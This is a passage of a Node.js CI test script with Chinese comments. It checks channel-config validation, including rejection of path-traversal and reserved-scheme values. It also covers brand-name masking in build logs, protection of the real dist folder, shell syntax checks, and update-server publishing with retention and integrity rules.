    mkdirSync(join(root, 'channels', 'official'), { recursive: true })
    writeFileSync(join(root, 'channels', 'official', 'channel.json'),
      '{"schema":1,"channel_id":"official","identity":{"display_name":"Official","short_name":"Official"},"desktop":{"app_origin_scheme":"picoaide-app"}}')
    mkdirSync(join(root, 'channels', 'example-brand'), { recursive: true })
    writeFileSync(join(root, 'channels', 'example-brand', 'channel.json'), JSON.stringify({
      schema: 1,
      channel_id: 'example-brand',
      identity: { display_name: 'Example', short_name: 'Example' },
      desktop: {
        slug: 'Example-AI',
        app_id: 'com.example.brand',
        deep_link_scheme: 'examplebrand',
        app_origin_scheme: 'examplebrand-app',
        ...(homeDirValue === undefined ? {} : { home_dir: homeDirValue }),
      },
    }))
    padChannelRepo(root) // 下限补位（同上）
    return runChannels({ source: root, refName: 'v2.7.0', dest: 'channels', list: 'p.list' })
  }

  const noHome = brandOnly(undefined)
  check(noHome.status !== 0, '品牌渠道缺 desktop.home_dir 时必须失败')
  check(noHome.stderr.includes('desktop.home_dir'), '失败信息应点明缺 desktop.home_dir')

  const sharedHome = brandOnly('.picoaide-harness')
  check(sharedHome.status !== 0, '渠道数据目录写成官方目录时必须失败(那是共用数据根)')
  check(sharedHome.stderr.includes('desktop.home_dir'), '失败信息应点明是 desktop.home_dir 的问题')

  for (const [value, why] of [
    ['../escape', '带路径分隔符'],
    ['/abs', '绝对路径'],
    ['Acme-Harness', '缺前导点/含大写'],
    ['.', '只有一个点'],
    ['', '空串'],
  ]) {
    const bad = brandOnly(value)
    check(bad.status !== 0, `desktop.home_dir 是${why}时必须失败`)
    check(bad.stderr.includes('desktop.home_dir'), `desktop.home_dir(${why})的失败信息应点名该字段`)
  }

  // `desktop.product_name`(2026-09-12 审计 P1-13):它是 Electron userData 目录名
  // 与 mac `.app` 目录名的输入(`desktop-user-data.ts` / `release-mac.ts`),却是这批
  // 字段里唯一没有形状校验的。`../evil` 会把数据根挪出 `appData`;两个渠道取同一个
  // 产品名会共用 userData(单实例锁互顶 + 状态互相污染)。只能在构建期拦。
  const withProductName = productName => {
    const root = tempDir('ci-channels-product-')
    mkdirSync(join(root, 'channels', 'official'), { recursive: true })
    writeFileSync(join(root, 'channels', 'official', 'channel.json'),
      '{"schema":1,"channel_id":"official","identity":{"display_name":"Official","short_name":"Official"},"desktop":{"app_origin_scheme":"picoaide-app"}}')
    mkdirSync(join(root, 'channels', 'example-brand'), { recursive: true })
    writeFileSync(join(root, 'channels', 'example-brand', 'channel.json'), JSON.stringify({
      schema: 1,
      channel_id: 'example-brand',
      identity: { display_name: 'Example Brand', short_name: 'Example' },
      desktop: {
        product_name: productName,
        slug: 'Example-AI',
        app_id: 'com.example.brand',
        deep_link_scheme: 'examplebrand',
        home_dir: '.example-harness',
        app_origin_scheme: 'examplebrand-app',
      },
    }))
    padChannelRepo(root) // 下限补位（同上）
    return runChannels({ source: root, refName: 'v2.7.0', dest: 'channels', list: 'pn.list' })
  }
  for (const [value, why] of [
    ['../evil', '路径穿越'],
    ['..', '父目录'],
    ['Acme/../../x', '内嵌分隔符'],
    ['Acme\\Harness', '反斜杠'],
    ['Acme\u0000Harness', '控制字符'],
    ['Acme.', '结尾是点(Windows 目录名非法)'],
    ['A'.repeat(65), '超长'],
  ]) {
    const bad = withProductName(value)
    check(bad.status !== 0, `desktop.product_name 是${why}时必须失败`)
    check(bad.stderr.includes('desktop.product_name'), `desktop.product_name(${why})的失败信息应点名该字段`)
  }
  const goodProductName = withProductName('Example Brand')
  check(
    goodProductName.status === 0,
    `合法的 desktop.product_name 必须通过,实际退出 ${String(goodProductName.status)}: ${goodProductName.stderr.slice(0, 200)}`,
  )
  // 失败信息不得回显取值:渠道包里它就是客户品牌,而这一步的输出进公开 Actions 日志。
  const leakyProductName = withProductName('../SuperSecretBrand')
  check(
    !`${leakyProductName.stdout}${leakyProductName.stderr}`.includes('SuperSecretBrand'),
    'desktop.product_name 的失败信息不得回显取值(客户品牌不进公开日志)',
  )

  // beta(2026-09-12 用户定案):预发版是正式版的前置验证,数据根**必须**与官方
  // 正式版一致 —— 否则装预发版的用户升级后看不到既有会话与登录态(当天早些时候
  // 改成独立目录 `.picoaide-harness-beta` 就是这么炸的:用户报"所有对话都没了",
  // 旧数据留在官方目录、新客户端读的是新目录)。因此这里三条用例:写官方目录必须
  // **通过**、写自己的目录必须**失败**、缺字段必须失败 —— 规则显式且唯一,防止
  // 再次静默漂移。
  const betaShared = tempDir('ci-channels-beta-home-')
  mkdirSync(join(betaShared, 'channels', 'beta'), { recursive: true })
  const betaChannel = (homeDir) => JSON.stringify({
    schema: 1,
    channel_id: 'beta',
    identity: { display_name: 'PicoAide Harness', short_name: 'PicoAide' },
    // desktop.app_origin_scheme 是**全部渠道**必填(含 beta,2026-09-19 §10);公共
    // 渠道共用 `picoaide-app` 命名空间。三条用例都带上它,这样它们只测 home_dir 一条规则
    // (否则"缺 app_origin_scheme"会先于 home_dir 报错,把用例测成别的东西)。
    desktop: {
      app_origin_scheme: 'picoaide-app',
      ...(homeDir === undefined ? {} : { home_dir: homeDir }),
    },
  })
  padChannelRepo(betaShared) // 下限补位：让目录集形状与真实渠道仓一致（预发线上下限只告警，但形状要一致）
  writeFileSync(join(betaShared, 'channels', 'beta', 'channel.json'), betaChannel('.picoaide-harness'))
  const betaSharedRun = runChannels({ source: betaShared, refName: 'v2.7.0-beta.3', dest: 'channels', list: 'q.list' })
  check(betaSharedRun.status === 0, 'beta 与官方正式版共用数据目录必须通过（预发版要延续既有会话与登录态）')

  writeFileSync(join(betaShared, 'channels', 'beta', 'channel.json'), betaChannel('.picoaide-harness-beta'))
  const betaOwnRun = runChannels({ source: betaShared, refName: 'v2.7.0-beta.3', dest: 'channels', list: 'q.list' })
  check(betaOwnRun.status !== 0, 'beta 写自己的数据目录必须失败（会让预发版用户升级后看不到既有会话）')
  check(betaOwnRun.stderr.includes('desktop.home_dir'), 'beta 数据目录不一致的失败信息应点名 desktop.home_dir')

  writeFileSync(join(betaShared, 'channels', 'beta', 'channel.json'), betaChannel(undefined))
  const betaMissingRun = runChannels({ source: betaShared, refName: 'v2.7.0-beta.3', dest: 'channels', list: 'q.list' })
  check(betaMissingRun.status !== 0, 'beta 缺 desktop.home_dir 必须失败（非 official 渠道一律必填）')
}

// ---- 3b. desktop.app_origin_scheme:必填 / 形状 / 保留字 / 跨渠道唯一 ----
//
// 为什么必须有这一组(2026-09-19 设计 §10/§8.3):这个字段是 WASM 应用的**客户端协议
// origin** —— 客户端按它注册特权 scheme、在合成请求里写 Origin,服务端按它校验来源。
// 它出错的方式全是静默的:缺字段 ⇒ 两端各自回落(派生值 / 中性 fallback),取值不一致
// 就是"应用打不开"且故障现象与配置毫无关系;与深链 scheme 同值 ⇒"深链回调"与"应用页"
// 在协议栈层面撞在一起;取保留 scheme ⇒ 应用页与 http(s)/file/data/… 的既有语义打架;
// **两个渠道同值 ⇒ 两个渠道的客户端应用页同源、可以互相读取**(渠道隔离在协议层失效,
// 跨租户)。所以:必填/形状/保留字归逐渠道校验,跨渠道唯一归循环之后的独立扫描 ——
// 两条路径都必须有用例。报错纪律同 slug/app_id:**只报字段名,绝不回显取值**。
{
  // 夹具:official/beta 是**两个公共渠道**(共用 `picoaide-app` 命名空间,§16 W3),
  // 品牌渠道用 `<id 去连字符>-app`。`desktopByChannel` 逐渠道覆盖 desktop,传 `{}`
  // = 显式不写 app_origin_scheme(造"缺字段"负例);品牌渠道其余编译期字段照主夹具
  // 给全,确保每条负例只在被测的那条规则上失败。
  const originRepo = (desktopByChannel) => {
    const dir = tempDir('ci-channels-origin-')
    for (const [id, desktop] of Object.entries(desktopByChannel)) {
      mkdirSync(join(dir, 'channels', id), { recursive: true })
      const publicChannel = id === 'official' || id === 'beta'
      const base = publicChannel
        ? (id === 'beta' ? { home_dir: '.picoaide-harness' } : {})
        : {
            slug: `${id}-AI`,
            app_id: `com.example.${id.replaceAll('-', '')}`,
            deep_link_scheme: `${id.replaceAll('-', '')}link`,
            home_dir: `.${id}-harness`,
          }
      writeFileSync(join(dir, 'channels', id, 'channel.json'), JSON.stringify({
        schema: 1,
        channel_id: id,
        identity: { display_name: `${id} AI`, short_name: id },
        desktop: { ...base, ...desktop },
      }))
    }
    padChannelRepo(dir) // 下限补位（同上）：负例只测被测的那条规则
    return dir
  }
  const runOrigin = desktopByChannel => runChannels({
    source: originRepo(desktopByChannel), refName: 'v2.7.0', dest: 'channels', list: 'or.list',
  })
  const PUBLIC_ORIGIN = { app_origin_scheme: 'picoaide-app' }
  const BRAND_ORIGIN = { app_origin_scheme: 'examplebrand-app' }

  // 正例:公共渠道 official/beta 共用 `picoaide-app`(设计如此,**不是**重复),品牌渠道
  // 各用不同的值 ⇒ 必须通过。它同时钉住"公共渠道也被要求显式写字段"这半步。
  const goodOrigin = runOrigin({
    official: PUBLIC_ORIGIN,
    beta: PUBLIC_ORIGIN,
    'example-brand': BRAND_ORIGIN,
    zeta: { app_origin_scheme: 'zeta-app' },
  })
  check(
    goodOrigin.status === 0,
    `合法 app_origin_scheme 的渠道集必须通过(公共渠道共用 picoaide-app 属设计),实际 exit=${goodOrigin.status}: ${goodOrigin.stderr.trim()}`,
  )

  // 负例 1:official 缺字段。**公共渠道不豁免必填** —— 缺字段时服务端拒绝启动、客户端
  // 回落派生值,发行镜像里这就是"应用打不开"。
  const missingOrigin = runOrigin({
    official: {},
    beta: PUBLIC_ORIGIN,
    'example-brand': BRAND_ORIGIN,
  })
  check(missingOrigin.status !== 0, 'official 缺 desktop.app_origin_scheme 必须失败(公共渠道不豁免必填)')
  check(missingOrigin.stderr.includes('desktop.app_origin_scheme'), '缺字段的失败信息应点名 desktop.app_origin_scheme')

  // 负例 2:两个品牌渠道取同一个值(品牌渠道之间没有共享命名空间)⇒ 必须失败,且输出
  // **不得出现该取值** —— 它就是客户品牌,而这里进公开 Actions 日志;跨渠道扫描同样
  // 不得回显渠道 id/目录名(stderr 里连 ::add-mask:: 指令行都不该有,那是 stdout)。
  const SHARED_BRAND_ORIGIN = 'example-brand-app'
  const dupOrigin = runOrigin({
    official: PUBLIC_ORIGIN,
    beta: PUBLIC_ORIGIN,
    'example-brand': { app_origin_scheme: SHARED_BRAND_ORIGIN },
    zeta: { app_origin_scheme: SHARED_BRAND_ORIGIN },
  })
  check(dupOrigin.status !== 0, '两个品牌渠道取同一个 desktop.app_origin_scheme 必须失败(应用页会同源)')
  check(dupOrigin.stderr.includes('desktop.app_origin_scheme'), '跨渠道重复的失败信息应点名 desktop.app_origin_scheme')
  check(dupOrigin.stderr.includes('跨渠道重复'), '跨渠道重复的失败信息应说明是"跨渠道重复"(中性词)')
  const dupOut = `${dupOrigin.stdout}${dupOrigin.stderr}`
  check(!dupOut.includes(SHARED_BRAND_ORIGIN), '跨渠道重复的失败信息不得回显 scheme 取值(那就是客户品牌)')
  check(!/\b(example-brand|zeta)\b/u.test(dupOrigin.stderr), '跨渠道重复的失败信息不得回显渠道 id')

  // 负例 2b:品牌渠道**取公共渠道的值**也要失败(那会让品牌客户端与官方客户端同源)。
  // 唯一性豁免只给"公共渠道之间"这一种形态(§8.3 R2I-13 订正),不是"公共取值谁都能用"。
  const publicTakenOrigin = runOrigin({
    official: PUBLIC_ORIGIN,
    beta: PUBLIC_ORIGIN,
    'example-brand': PUBLIC_ORIGIN,
  })
  check(publicTakenOrigin.status !== 0, '品牌渠道取公共渠道的 app_origin_scheme 必须失败(与官方客户端同源)')
  check(publicTakenOrigin.stderr.includes('desktop.app_origin_scheme'), '品牌占用公共取值的失败信息应点名该字段')

  // 负例 3:形状非法 —— 含大写、超过 32 字符(正则**有上界**,不是无上界的宽松版本)、
  // 不以小写字母开头。两端(Go/TS)各有一份同源正则,这里拦不住就是"服务端拒绝、客户端照发"。
  for (const [value, why] of [
    ['ExampleBrand-App', '含大写'],
    ['a'.repeat(33), '超过 32 字符'],
    ['-app', '连字符开头'],
  ]) {
    const bad = runOrigin({
      official: PUBLIC_ORIGIN,
      beta: PUBLIC_ORIGIN,
      'example-brand': { app_origin_scheme: value },
    })
    check(bad.status !== 0, `desktop.app_origin_scheme ${why}时必须失败`)
    check(bad.stderr.includes('desktop.app_origin_scheme'), `desktop.app_origin_scheme(${why})的失败信息应点名该字段`)
  }

  // 负例 4:与同渠道的 deep_link_scheme 同值 —— 两者在客户端里是两个不同的注册项
  // (深链回调 vs 应用页 origin),同值会让它们在协议栈层面撞在一起。
  const sameAsLink = runOrigin({
    official: PUBLIC_ORIGIN,
    beta: PUBLIC_ORIGIN,
    'example-brand': { deep_link_scheme: 'acmelink', app_origin_scheme: 'acmelink' },
  })
  check(sameAsLink.status !== 0, 'app_origin_scheme 与 deep_link_scheme 同值必须失败')
  check(sameAsLink.stderr.includes('desktop.app_origin_scheme'), '同值失败信息应点名 desktop.app_origin_scheme')
  check(
    !`${sameAsLink.stdout}${sameAsLink.stderr}`.includes('acmelink'),
    '同值失败信息不得回显取值(只报字段名 + "必须不同"这一事实)',
  )

  // 负例 5:保留 scheme —— 浏览器/系统已有既定语义,拿去当应用 origin 会让应用页与它们
  // 冲突,也过不了特权 scheme 注册。§10 冻结名单逐个覆盖(名单是固定常量,与渠道无关)。
  for (const value of ['http', 'https', 'file', 'data', 'javascript', 'about']) {
    const reserved = runOrigin({
      official: PUBLIC_ORIGIN,
      beta: PUBLIC_ORIGIN,
      'example-brand': { app_origin_scheme: value },
    })
    check(reserved.status !== 0, `保留 scheme ${value} 必须失败`)
    check(reserved.stderr.includes('desktop.app_origin_scheme'), `保留 scheme ${value} 的失败信息应点名该字段`)
  }
}

// ---- 4/5. 逐渠道打包:日志抑制、失败中性、产物归集 ----
{
  const runDir = tempDir('ci-package-run-')
  const stage = join(runDir, 'stage')
  const list = join(runDir, 'ch.list')
  // 产物目录落在 runDir 下,假打包器与脚本都不得碰仓库里真实的
  // packages/host/desktop/dist —— 脚本每个渠道开头就 `rm -rf "$DIST"`,缺省值是
  // **真实** dist,跑一次 `yarn check` 就会把刚打好的包删掉(2026-09-11 实测:
  // yarn check 后 dist/linux-unpacked 整个消失,后面的 E2E 报 app binary not found)。
  const distDir = join(runDir, 'dist')
  mkdirSync(distDir, { recursive: true })
  // 哨兵文件：下面几个用例都调 ci-package-clients.sh，而它每个渠道开头就
  // `rm -rf "$DIST"`，缺省的 DIST 是**仓库里真实的** packages/host/desktop/dist ——
  // 少传一次 `--dist` 就会把开发机/CI 刚打好的包删掉（2026-09-11 实测：
  // `yarn check` 之后 dist/ 变空，随后的 e2e 报 app binary not found）。
  // 用例跑完在这里断言哨兵还在，把"漏传 --dist"变成红灯而不是静默删产物。
  const realDist = join(root, 'packages', 'host', 'desktop', 'dist')
  const sentinel = join(realDist, '.verify-ci-scripts-sentinel')
  mkdirSync(realDist, { recursive: true })
  writeFileSync(sentinel, 'keep')
  writeFileSync(list, 'official\nexample-brand\n')

  // 假打包器:回显渠道名并产出两种文件;渠道名出现在**输出**里,
  // 真实 CI 中会被 ::add-mask:: 抹掉,这里只断言"渠道构建不输出"这一层。
  const stub = join(runDir, 'stub.sh')
  writeFileSync(stub, `#!/usr/bin/env bash
 echo "building for \${DSH_BUILD_CHANNEL}"
 mkdir -p "${distDir}"
 echo x > "${distDir}/App-\${DSH_BUILD_CHANNEL}.AppImage"
 echo y > "${distDir}/App-\${DSH_BUILD_CHANNEL}.deb"
`)
  execFileSync('chmod', ['+x', stub])

  // 白标门禁桩:真实脚本要读 build/ 与私有渠道仓,回归测试里换成"永远通过"的桩。
  // (桩自身也在测:门禁是**在打包之后、归集之前**被调用的。)
  const verifyStub = join(runDir, 'verify-ok.mjs')
  writeFileSync(verifyStub, `console.log(\`verify stub: \${process.env.DSH_BUILD_CHANNEL} \${process.argv.slice(2).join(' ')}\`)
`)

  // --dist：必须指到 runDir,否则脚本的缺省产物目录是**仓库里真实的**
  // packages/host/desktop/dist,而它每个渠道开头就 `rm -rf "$DIST"` ——
  // 跑一次 `yarn check` 就会把开发机/CI 上刚打好的包删掉(2026-09-11 实测踩到:
  // yarn check 之后 dist/linux-unpacked 整个消失,E2E 报"app binary not found")。
  const ok = spawnSync('bash', [
    packageScript, '--list', list, '--stage-dir', stage, '--dist', distDir,
    '--patterns', '*.AppImage *.deb', '--', stub,
  ], { cwd: root, encoding: 'utf8', env: { ...process.env, CI_CHANNEL_VERIFY_SCRIPT: verifyStub } })
  check(ok.status === 0, `逐渠道打包应成功,实际退出 ${String(ok.status)}`)
  check((ok.stdout ?? '').includes('building for official'), '官方渠道必须保留完整日志(排障基准)')
  check(!(ok.stdout ?? '').includes('building for example-brand'), '渠道构建的输出不得出现在日志里')
  check(existsSync(join(stage, 'official', 'App-official.AppImage')), '官方产物应归集到 client-assets/<channel>/')
  check(existsSync(join(stage, 'example-brand', 'App-example-brand.deb')), '渠道产物应归集到自己的目录')
  check((ok.stdout ?? '').includes('verify stub: official'), '官方渠道必须跑白标门禁')
  check(!(ok.stdout ?? '').includes('verify stub: example-brand'), '渠道的白标门禁输出也必须被抑制')

  // 白标门禁失败 → 报中性信息(不回显渠道名/门禁输出),且不许把产物当成功归集
  const verifyFail = join(runDir, 'verify-fail.mjs')
  writeFileSync(verifyFail, `if (process.env.DSH_BUILD_CHANNEL !== 'official') {
  console.log('VERIFY-SECRET-DETAIL')
  process.exit(4)
}
`)
  const stageGate = join(runDir, 'stage-gate')
  const gate = spawnSync('bash', [
    packageScript, '--list', list, '--stage-dir', stageGate, '--dist', distDir,
    '--patterns', '*.AppImage *.deb', '--', stub,
  ], { cwd: root, encoding: 'utf8', env: { ...process.env, CI_CHANNEL_VERIFY_SCRIPT: verifyFail } })
  check(gate.status !== 0, '渠道白标门禁失败必须让步骤失败')
  const gateLines = `${gate.stdout ?? ''}${gate.stderr ?? ''}`
    .split('\n')
    .filter(line => !line.startsWith('::add-mask::'))
    .join('\n')
  check(!gateLines.includes('VERIFY-SECRET-DETAIL'), '门禁失败不得回显门禁输出')
  check(!gateLines.includes('example-brand'), '门禁失败信息里不得出现渠道名')
  check(!existsSync(join(stageGate, 'example-brand')), '门禁失败的渠道不得被归集为可用产物')

  // 渠道构建失败 → 只报中性信息,不回显渠道名与命令输出
  // 秘密标记只在**渠道**那一轮打印:官方轮是允许输出日志的。
  //
  // 白标门禁同样注入桩(2026-09-12):这个用例要验的是**打包失败**那条分支的文案,
  // 而官方轮若跑真实门禁,结果取决于工作树里有没有 `packages/host/desktop/build/`
  // 这份打包残留 —— 本地有(于是绿)、干净 checkout 没有(于是官方轮先因"品牌素材
  // 不存在"失败,文案变成"官方渠道的白标门禁未通过",断言随即红)。注入桩之后
  // 这条用例只依赖被测的失败路径本身,与工作树状态无关。
  const failStub = join(runDir, 'fail.sh')
  writeFileSync(failStub, `#!/usr/bin/env bash
if [ "\${DSH_BUILD_CHANNEL}" != "official" ]; then
  echo "SECRET-CHANNEL-DETAIL"
  echo "\${DSH_BUILD_CHANNEL}" >&2
  exit 3
fi
mkdir -p "${distDir}"
echo x > "${distDir}/App.AppImage"
`)
  execFileSync('chmod', ['+x', failStub])
  const stage2 = join(runDir, 'stage2')
  const failed = spawnSync('bash', [
    packageScript, '--list', list, '--stage-dir', stage2, '--dist', distDir,
    '--patterns', '*.AppImage', '--', failStub,
  ], { cwd: root, encoding: 'utf8', env: { ...process.env, CI_CHANNEL_VERIFY_SCRIPT: verifyStub } })
  check(failed.status !== 0, '渠道打包失败必须让步骤失败')
  // `::add-mask::<id>` 这一行本身含渠道 id —— 那是掩码指令(GitHub 不会把它
  // 回显进公开日志),比对时先剔除,只看真正的输出行。
  const failureLines = `${failed.stdout ?? ''}${failed.stderr ?? ''}`
    .split('\n')
    .filter(line => !line.startsWith('::add-mask::'))
    .join('\n')
  check(!failureLines.includes('SECRET-CHANNEL-DETAIL'), '失败时不得回显渠道构建的输出')
  check(!failureLines.includes('example-brand'), '失败信息里不得出现渠道名')
  check(failureLines.includes('官方构建'), '失败信息应指引去看官方构建的日志')

  // 三个打包用例都不许动仓库里真实的 dist/（哨兵法：被 `rm -rf "$DIST"` 连目录一起删掉）。
  check(existsSync(sentinel), '打包脚本用例不得删除仓库里真实的 packages/host/desktop/dist（漏传 --dist）')
  rmSync(sentinel, { force: true })
}

// ---- 6. 所有 CI shell 脚本必须能通过 bash -n ----
// 2026-09-10 的教训:两处未闭合引号让整个 release job 跑不起来,而 YAML 本身
// 完全合法 —— 只有 bash 解析整段脚本时才会发现。这里把 scripts/ 下的 shell
// 脚本全部过一遍,避免同类错误再次静默进入发布链。
{
  const scriptDir = join(root, 'scripts')
  const shells = readdirSync(scriptDir).filter(name => name.endsWith('.sh'))
  check(shells.length > 0, 'scripts/ 下应有 CI shell 脚本')
  for (const name of shells) {
    const result = spawnSync('bash', ['-n', join(scriptDir, name)], { encoding: 'utf8' })
    check(result.status === 0, `scripts/${name} 未通过 bash -n: ${(result.stderr ?? '').trim()}`)
  }
}

// ---- 6. 更新服务器(R2)发布:布局 / 清单 / 保留策略 / 缓存头 ----
{
  const work = tempDir('ci-publish-')
  const bundle = join(work, 'release-bundle')
  const list = join(work, 'channels.list')
  const store = join(work, 'store')
  writeFileSync(list, 'official\nbeta\nexample-brand\n')

  // 假 aws:把 s3/s3api 子命令变成对本地目录的操作,并把参数记进日志,便于断言。
  const log = join(work, 'aws.log')
  writeFileSync(log, '')
  const fakeAws = join(work, 'aws')
  writeFileSync(fakeAws, fakeAwsScript({ store, log }))
  execFileSync('chmod', ['+x', fakeAws])

  // 每个渠道造一份"已构建"的镜像包。SHA256SUMS 必须**真的**写着该包的 sha256 ——
  // 发布脚本会先做本地产物自洽检查(空/写错包名的清单在客户侧表现为"校验永远不过")。
  const bundleSums = (channel, content) => {
    const digest = createHash('sha256').update(content).digest('hex')
    writeFileSync(join(bundle, channel, 'SHA256SUMS'), `${digest}  picoaide-server-2.7.0-amd64.zip\n`)
  }
  for (const channel of ['official', 'beta', 'example-brand']) {
    mkdirSync(join(bundle, channel), { recursive: true })
    const content = `zip-${channel}`
    writeFileSync(join(bundle, channel, 'picoaide-server-2.7.0-amd64.zip'), content)
    bundleSums(channel, content)
  }
  // 早于保留窗口的旧版本(应被清掉)与较新版本(应保留)。
  mkdirSync(join(store, 'official', 'releases', '2.5.0'), { recursive: true })
  mkdirSync(join(store, 'official', 'releases', '2.6.0'), { recursive: true })
  mkdirSync(join(store, 'official', 'releases', '2.6.1'), { recursive: true })

  const run = spawnSync('bash', [publishScript, '--list', list, '--bundle', bundle], {
    cwd: work,
    encoding: 'utf8',
    env: {
      PATH: `${work}:${process.env.PATH ?? ''}`,
      HOME: process.env.HOME ?? '',
      R2_ACCOUNT_ID: 'test-account',
      R2_BUCKET: 'test-bucket',
      VERSION: 'v2.7.0',
    },
  })
  check(run.status === 0, `R2 发布应成功,实际退出 ${String(run.status)}: ${run.stderr ?? ''}`)
  check(run.stdout.includes('::add-mask::example-brand'), '发布步骤必须自己再掩码渠道 id')
  // 掩码行本身必然含渠道名(GitHub 从这一刻起把它抹成 ***);除此之外不得出现。
  const visible = run.stdout.split('\n').filter(line => !line.startsWith('::add-mask::')).join('\n')
  check(!visible.includes('example-brand'), '渠道名不得出现在发布日志里(掩码行除外)')

  // 每个渠道一套独立目录 + 版本化资产 + 清单。
  for (const channel of ['official', 'beta', 'example-brand']) {
    const dir = join(store, channel)
    check(existsSync(join(dir, 'releases', '2.7.0', 'picoaide-server-2.7.0-amd64.zip')), `${channel}: 应上传 zip`)
    check(existsSync(join(dir, 'releases', '2.7.0', 'SHA256SUMS')), `${channel}: 应上传 SHA256SUMS`)
    const manifestPath = join(dir, 'latest.json')
    check(existsSync(manifestPath), `${channel}: 应写 latest.json`)
    if (!existsSync(manifestPath)) continue
    const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'))
    check(manifest.channel_id === channel, `${channel}: 清单 channel_id 必须指向自己(渠道独立)`)
    check(manifest.server.version === '2.7.0' && manifest.server.image_tag === 'v2.7.0', `${channel}: 清单版本应为 2.7.0`)
    check(
      manifest.server.image_asset === `https://release.picoaide.com/${channel}/releases/2.7.0/picoaide-server-2.7.0-amd64.zip`,
      `${channel}: 清单里的下载地址必须指向**本渠道**目录,实际 ${manifest.server.image_asset}`,
    )
    check(typeof manifest.published_at === 'string' && manifest.published_at.endsWith('Z'), `${channel}: 清单需要 UTC 发布时间`)
  }

  // 保留策略:最近 3 个版本(2.6.0/2.6.1/2.7.0),最旧的 2.5.0 被清掉。
  check(!existsSync(join(store, 'official', 'releases', '2.5.0')), '超出保留窗口的旧版本应被清理')
  check(existsSync(join(store, 'official', 'releases', '2.6.0')), '保留窗口内的版本不得误删')
  check(existsSync(join(store, 'official', 'releases', '2.6.1')), '保留窗口内的版本不得误删')

  // 缓存头:资产不可变长缓存、指针 no-cache(否则新版本不生效)。
  const awsLog = readFileSync(log, 'utf8')
  if (process.env.DEBUG_PUBLISH === '1') process.stderr.write(`--- aws.log ---\n${awsLog}\n--- store ---\n${execFileSync('find', [store, '-type', 'f']).toString()}\n`)
  check(awsLog.includes('max-age=31536000, immutable'), '版本化资产必须带 immutable 长缓存')
  check(/latest\.json.*no-cache/.test(awsLog), 'latest.json 必须 no-cache(否则客户端拿不到新版本)')
  const lines = awsLog.split('\n').filter(line => line !== '')
  const firstAsset = lines.findIndex(line => line.includes('official/SHA256SUMS'))
  const firstManifest = lines.findIndex(line => line.includes('latest.json'))
  check(firstAsset !== -1 && firstManifest > firstAsset, '清单应在资产之后写入(避免指向空目录)')

  // 缺 R2 secrets 且**这次要发品牌渠道** → 必须失败(品牌渠道只有 R2 一个分发面,
  // 静默跳过 = 客户零交付而流水线全绿)。
  const brandNoCreds = spawnSync('bash', [publishScript, '--list', list, '--bundle', bundle], {
    cwd: work,
    encoding: 'utf8',
    env: { PATH: `${work}:${process.env.PATH ?? ''}`, HOME: process.env.HOME ?? '', VERSION: 'v2.7.0' },
  })
  check(brandNoCreds.status !== 0, '含品牌渠道时缺 R2 凭据必须失败')
  check(
    `${brandNoCreds.stderr ?? ''}`.includes('品牌渠道'),
    '失败信息应说明品牌渠道只经更新服务器分发',
  )

  // 只有官方/beta → 跳过而不是失败(GitHub Release 仍要可用)。
  const publicList = join(work, 'public-channels.list')
  writeFileSync(publicList, 'official\nbeta\n')
  const skipped = spawnSync('bash', [publishScript, '--list', publicList, '--bundle', bundle], {
    cwd: work,
    encoding: 'utf8',
    env: { PATH: `${work}:${process.env.PATH ?? ''}`, HOME: process.env.HOME ?? '', VERSION: 'v2.7.0' },
  })
  check(skipped.status === 0, 'R2 secrets 未配置时应跳过而非失败')
  check(`${skipped.stdout ?? ''}${skipped.stderr ?? ''}`.includes('跳过'), '跳过时应给出告警')

  // 产物缺失 → fail-loud(绝不发布不完整版本)。
  rmSync(join(bundle, 'beta', 'SHA256SUMS'))
  const incomplete = spawnSync('bash', [publishScript, '--list', list, '--bundle', bundle], {
    cwd: work,
    encoding: 'utf8',
    env: {
      PATH: `${work}:${process.env.PATH ?? ''}`,
      HOME: process.env.HOME ?? '',
      R2_ACCOUNT_ID: 'test-account',
      R2_BUCKET: 'test-bucket',
      VERSION: 'v2.7.0',
    },
  })
  check(incomplete.status !== 0, '缺 SHA256SUMS 时必须失败')
  check((incomplete.stderr ?? '').includes('缺失'), '失败信息应说明缺什么')

  // 缺 VERSION → fail-loud。
  const noVersion = spawnSync('bash', [publishScript, '--list', list, '--bundle', bundle], {
    cwd: work,
    encoding: 'utf8',
    env: { PATH: `${work}:${process.env.PATH ?? ''}`, HOME: process.env.HOME ?? '', R2_ACCOUNT_ID: 'a', R2_BUCKET: 'b' },
  })
  check(noVersion.status !== 0, '缺 VERSION 时必须失败')
}

// ---- 6b. R2 上传后必须做「大小 + 哈希」完整性校验(2026-09-23 审计 K-01) ----
//
// 为什么必须有这一组:`aws s3 cp` 的退出码只表示"请求成功",不表示"远端字节完整"。
// 2026-09-22 现场实测过对象在 382,992,384B 处截断(宣告 522MB)而全链路绿灯;审计
// 探针里"只写入前 10 字节"的假 aws 也让脚本 EXIT=0 并写出指向损坏对象的 latest.json。
// 旧实现唯一的检查是"对象存在"(`aws s3 ls` 有输出即可)。
//
// 判据(每条都要能被打坏 —— 正向对照保证这些用例不是恒红):
//   A. 假 aws 截断上传(退出码 0,只写前 10 字节)→ 必须非 0,且**不写** latest.json;
//   B. 远端大小被改错 → 必须非 0,且**不写** latest.json;
//   C. 远端校验和与本地不一致 → 必须非 0,且**不写** latest.json;
//   D. 远端没有校验和(None)→ 必须非 0(不退化成"只校大小");
//   E. 正向对照:完整上传 + 正确大小/校验和 → EXIT=0 且写出 latest.json。
{
  const work = tempDir('ci-publish-integrity-')
  const bundle = join(work, 'release-bundle')
  const list = join(work, 'channels.list')
  const store = join(work, 'store')
  const log = join(work, 'aws.log')
  writeFileSync(log, '')
  writeFileSync(list, 'official\n')

  const zipName = 'picoaide-server-9.9.9-amd64.zip'
  const content = 'zip-official-integrity-probe'
  mkdirSync(join(bundle, 'official'), { recursive: true })
  writeFileSync(join(bundle, 'official', zipName), content)
  writeFileSync(
    join(bundle, 'official', 'SHA256SUMS'),
    `${createHash('sha256').update(content).digest('hex')}  ${zipName}\n`,
  )

  const fakeAws = join(work, 'aws')
  writeFileSync(fakeAws, fakeAwsScript({ store, log }))
  execFileSync('chmod', ['+x', fakeAws])

  const runPublish = faults => spawnSync('bash', [publishScript, '--list', list, '--bundle', bundle], {
    cwd: work,
    encoding: 'utf8',
    env: {
      PATH: `${work}:${process.env.PATH ?? ''}`,
      HOME: process.env.HOME ?? '',
      R2_ACCOUNT_ID: 'test-account',
      R2_BUCKET: 'test-bucket',
      VERSION: 'v9.9.9',
      ...faults,
    },
  })
  const manifestPath = join(store, 'official', 'latest.json')
